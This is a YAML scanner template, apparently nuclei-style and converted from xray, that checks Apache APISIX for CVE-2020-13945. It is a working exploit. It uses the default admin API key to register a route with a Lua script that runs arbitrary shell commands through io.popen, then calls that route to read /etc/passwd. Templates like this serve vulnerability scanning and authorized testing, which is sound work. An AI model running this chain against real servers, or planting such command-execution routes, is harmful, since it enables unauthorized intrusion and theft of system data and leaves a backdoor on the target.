id: poc-yaml-apache-apisix-cve-2020-13945-rce

info:
  name: poc-yaml-apache-apisix-cve-2020-13945-rce
  author: Monday
  severity: medium
  tags: xray-converted,rce,cve-2020-13945,ct-146369
  reference:
    - https://github.com/vulhub/vulhub/blob/e00b6928c5db067c76e30bc96818a96ae47618b5/apisix/CVE-2020-13945/README.zh-cn.md

http:
  - raw:
      - |
        POST /apisix/admin/routes HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        X-API-KEY: edd1c9f034335f136f87ad84b625c8f1

        {
        "uri": "/{{rand_base(8)}}",
        "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.{{rand_base(8)}}, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
        "upstream": {
        "type": "roundrobin",
        "nodes": {
        "example.com:80": 1
        }
        }
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
  - raw:
      - |
        GET /{{rand_base(8)}}?{{rand_base(8)}}=cat+/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200